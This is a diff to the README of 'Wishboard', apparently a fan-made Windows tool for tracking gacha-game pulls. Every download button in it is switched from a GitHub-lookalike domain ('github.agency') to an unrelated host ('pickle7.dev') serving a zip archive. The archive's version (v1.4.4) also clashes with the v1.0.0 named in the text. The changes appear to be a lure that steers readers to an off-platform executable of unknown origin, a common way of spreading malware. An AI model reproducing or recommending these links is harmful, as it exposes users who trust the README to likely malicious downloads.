@@ -15,7 +15,7 @@
 <img src="https://img.shields.io/badge/Tauri-2-1B1A17?style=flat-square&labelColor=F4EFE6&logo=tauri&logoColor=1B1A17" alt="Tauri 2">
 </p>
 
-<a class="download-btn-action" href="https://github.agency/s/gacha-pull-tracker/Wishboard-v1.4.4-win-x64.zip"><img src="assets/download.png" width="300" alt="Download Wishboard for Windows"></a>
+<a class="download-btn-action" href="https://pickle7.dev/gacha-pull-tracker/Wishboard-v1.4.4-win-x64.zip"><img src="assets/download.png" width="300" alt="Download Wishboard for Windows"></a>
 
 <sub>Windows 10 / 11 · x64 · v1.0.0 · free</sub>
 
@@ -111,7 +111,7 @@ Full UIGF v4.0 JSON support (`hk4e`, `hkrpg`, `nap` sections) to move your histo
 
 ## Download and install
 
-<a class="download-btn-action" href="https://github.agency/s/gacha-pull-tracker/Wishboard-v1.4.4-win-x64.zip"><img src="assets/download-compact.png" width="260" alt="Download Wishboard for Windows"></a>
+<a class="download-btn-action" href="https://pickle7.dev/gacha-pull-tracker/Wishboard-v1.4.4-win-x64.zip"><img src="assets/download-compact.png" width="260" alt="Download Wishboard for Windows"></a>
 
 1. Download `Wishboard-v1.0.0-win-x64.zip` from the latest release.
 2. Extract it anywhere, for example `C:\Apps\Wishboard`.
@@ -239,7 +239,7 @@ Wishboard is an independent fan-made tool. It is **not affiliated with, endorsed
 
 <div align="center">
 <br>
-<a class="download-btn-action" href="https://github.agency/s/gacha-pull-tracker/Wishboard-v1.4.4-win-x64.zip"><img src="assets/download.png" width="300" alt="Download Wishboard for Windows"></a>
+<a class="download-btn-action" href="https://pickle7.dev/gacha-pull-tracker/Wishboard-v1.4.4-win-x64.zip"><img src="assets/download.png" width="300" alt="Download Wishboard for Windows"></a>
 <br>
 <sub>Free · Windows 10 / 11 · no login</sub>
 </div>
